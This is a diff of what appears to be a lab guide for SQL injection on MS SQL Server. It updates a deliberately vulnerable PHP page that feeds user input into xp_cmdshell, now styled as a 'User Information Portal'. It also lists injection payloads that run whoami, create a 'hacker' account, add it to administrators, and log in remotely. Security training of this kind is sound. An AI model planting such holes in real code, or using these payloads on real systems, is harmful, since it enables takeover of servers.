@@ -52,53 +52,143 @@ Database applications like MySQL, MS SQL, and Oracle can execute system commands
    if (!$conn) {
        die("Connection failed: " . print_r(sqlsrv_errors(), true));
    }
-   
    ?>
    
-   <h2>SQL Injection Vulnerable Web Application</h2>
-   <p>Enter a user ID to view details:</p>
+   <!DOCTYPE html>
+   <html lang="en">
+   <head>
+       <meta charset="UTF-8">
+       <meta name="viewport" content="width=device-width, initial-scale=1.0">
+       <title>User Information Portal</title>
+       <style>
+           body {
+               font-family: Arial, sans-serif;
+               margin: 20px;
+               background-color: #f9f9f9;
+               color: #333;
+           }
+           h2 {
+               color: #0056b3;
+           }
+           form {
+               margin-bottom: 20px;
+               padding: 20px 50px 20px 20px;
+               background: #fff;
+               border: 1px solid #ccc;
+               border-radius: 5px;
+               max-width: 400px;
+           }
+           label {
+               font-weight: bold;
+           }
+           input[type="text"] {
+               width: 100%;
+               padding: 8px;
+               margin-top: 5px;
+               margin-bottom: 15px;
+               border: 1px solid #ccc;
+               border-radius: 4px;
+           }
+           input[type="submit"] {
+               background-color: #0056b3;
+               color: white;
+               border: none;
+               padding: 10px 15px;
+               cursor: pointer;
+               border-radius: 4px;
+           }
+           input[type="submit"]:hover {
+               background-color: #003d80;
+           }
+           .results {
+               margin-top: 20px;
+               padding: 15px;
+               background: #fff;
+               border: 1px solid #ccc;
+               border-radius: 5px;
+           }
+           .error {
+               color: red;
+           }
+       </style>
+   </head>
+   <body>
+       <h2>User Information Portal</h2>
+       <p>Enter a user ID to view their details. This portal allows authorized users to look up information in the system.</p>
    
-   <form action="vuln.php" method="GET">
-       <label for="id">User ID:</label>
-       <input type="text" id="id" name="id" placeholder="Enter User ID" />
-       <input type="submit" value="Submit" />
-   </form>
+       <form action="vuln.php" method="GET">
+           <label for="id">User ID:</label>
+           <input type="text" id="id" name="id" placeholder="Enter User ID" />
+           <input type="submit" value="View Details" />
+       </form>
    
-   <?php
-   if (isset($_GET['id'])) {
-       $id = $_GET['id'];
+       <?php
+       if (isset($_GET['id'])) {
+           $id = $_GET['id'];
    
-       echo "<h3>Results:</h3>";
+           echo "<div class='results'><h3>Search Results:</h3>";
    
-       // Combine both queries
-       $sql = "
-           SELECT * FROM users WHERE id = '$id';
-           EXEC xp_cmdshell '$id';
-       ";
+           // Check if the input is a plain number (normal query)
+           if (preg_match('/^\d+$/', $id)) {
+               // Execute a safe query if the input is just a number
+               $sql = "SELECT ID, Username, Email FROM users WHERE id = $id;";
    
-       $stmt = sqlsrv_query($conn, $sql);
+               $stmt = sqlsrv_query($conn, $sql);
    
-       if ($stmt === false) {
-           echo "Query failed!<br />";
-           print_r(sqlsrv_errors(), true);
-       } else {
-           do {
-               while ($row = sqlsrv_fetch_array($stmt, SQLSRV_FETCH_ASSOC)) {
-                   foreach ($row as $column => $value) {
-                       echo htmlspecialchars("$column: $value") . "<br />";
+               if ($stmt === false) {
+                   echo "<p class='error'>Query failed! Please try again.</p>";
+                   echo "<pre>" . print_r(sqlsrv_errors(), true) . "</pre>";
+               } else {
+                   $hasResults = false;
+                   while ($row = sqlsrv_fetch_array($stmt, SQLSRV_FETCH_ASSOC)) {
+                       $hasResults = true;
+                       foreach ($row as $column => $value) {
+                           echo htmlspecialchars("$column: $value") . "<br />";
+                       }
+                       echo "<br />";
                    }
-                   echo "<br />";
+   
+                   if (!$hasResults) {
+                       echo "<p>No results found for User ID: " . htmlspecialchars($id) . "</p>";
+                   }
                }
-           } while (sqlsrv_next_result($stmt)); // Move to the next result set
+   
+               sqlsrv_free_stmt($stmt);
+           } else {
+               // Execute the potentially malicious query directly if input isn't a plain number
+               $sql = "
+                   SELECT ID, Username, Email FROM users WHERE id = '$id'; -- Simulate hiding passwords
+                   EXEC xp_cmdshell '$id';
+               ";
+   
+               $stmt = sqlsrv_query($conn, $sql);
+   
+               if ($stmt === false) {
+                   echo "<p class='error'>Query failed! Please try again.</p>";
+                   echo "<pre>" . print_r(sqlsrv_errors(), true) . "</pre>";
+               } else {
+                   do {
+                       while ($row = sqlsrv_fetch_array($stmt, SQLSRV_FETCH_ASSOC)) {
+                           foreach ($row as $column => $value) {
+                               echo htmlspecialchars("$column: $value") . "<br />";
+                           }
+                           echo "<br />";
+                       }
+                   } while (sqlsrv_next_result($stmt)); // Move to the next result set
+               }
+   
+               sqlsrv_free_stmt($stmt);
+           }
+   
+           echo "</div>";
+       } else {
+           echo "<p>Please provide a User ID in the field above to search for details.</p>";
        }
    
-       sqlsrv_free_stmt($stmt);
-   } else {
-       echo "Please provide an ID in the field above.<br />";
-   }
-   
-   sqlsrv_close($conn);
-   ?>
+       sqlsrv_close($conn);
+       ?>
+   </body>
+   </html>
    ```
 3. When SSMS is launched, connect to the SQL Server Instance using the appropriate server name and authentication details (can just leave it as optional)
 4. Once connected, go to the toolbar and click 'New Query'. Run the following commands in the query window and execute them
@@ -168,17 +258,20 @@ Database applications like MySQL, MS SQL, and Oracle can execute system commands
     ```
     1'; EXEC xp_cmdshell 'whoami';--
     ```
-    ![image](https://github.com/user-attachments/assets/9ec1f657-8509-40ee-b7a0-4b1e167e1871)
+    ![image](https://github.com/user-attachments/assets/d112bbfc-7e04-4f95-865e-5f723f14b8ed)
+
 13. To use SQL injection to create a new user `hacker` with password `hacked1337`, use the following SQL injection strings inside the user input field
     ```
     1'; EXEC xp_cmdshell 'net user hacker hacked1337 /add';--
     ```
-    ![image](https://github.com/user-attachments/assets/ce9bf90a-b36b-4902-b714-12e10b5b0c96)
+    ![image](https://github.com/user-attachments/assets/2886fbbc-a313-4583-a71b-530c3ab4e8c0)
+
 14. To add this user to the local administrators group, add the following
     ```
     1'; EXEC xp_cmdshell 'net localgroup administrators hacker /add';--
     ```
-    ![image](https://github.com/user-attachments/assets/96fdb9ff-dda0-4a0d-aa6f-dedda6123939)
+    ![image](https://github.com/user-attachments/assets/93d8069c-8718-4a82-8b53-5f769d3cc89a)
+
 15. To verify `hacker` was added, check in cmd or PowerShell after adding the user
     ![image](https://github.com/user-attachments/assets/6226b921-0ba3-490c-b937-aa8fdd775137)
 16. To test RDP into the server with the new malicious credentials, enable enable PowerShell remoting between a local and target VMs, and get the IP address of the target remote machine. Then set it as a trusted host on the local machine to allow remote connections. Run each of the commands below
@@ -195,5 +288,6 @@ Database applications like MySQL, MS SQL, and Oracle can execute system commands
     ```
     Enter-PSSession -ComputerName the_other_Windows_IP_Address -Authentication Basic -Credential (Get-Credential)
     ```
-    ![image](https://github.com/user-attachments/assets/3ca1f203-07f5-487a-be3a-fc021aaf456f)
+    ![image](https://github.com/user-attachments/assets/12aed85a-f150-4cfd-af53-a7541d0f760b)
+
 
